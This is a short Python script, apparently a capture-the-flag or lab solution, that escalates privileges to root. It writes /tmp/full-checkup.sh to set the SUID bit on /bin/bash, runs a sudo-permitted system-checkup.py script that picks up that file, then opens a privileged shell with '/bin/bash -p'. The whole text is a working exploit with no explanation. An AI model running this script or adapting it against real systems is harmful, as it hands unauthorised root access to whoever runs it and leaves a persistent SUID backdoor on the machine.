import os

def rootFile():
	sh = open("/tmp/full-checkup.sh", "w")
	sh.write("#!/bin/bash\n\nchmod +s /bin/bash\n")
	sh.close()

def exploit():
	rootFile()
	os.system('cd /tmp;chmod +x full-checkup.sh;sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup;/bin/bash -p')
exploit()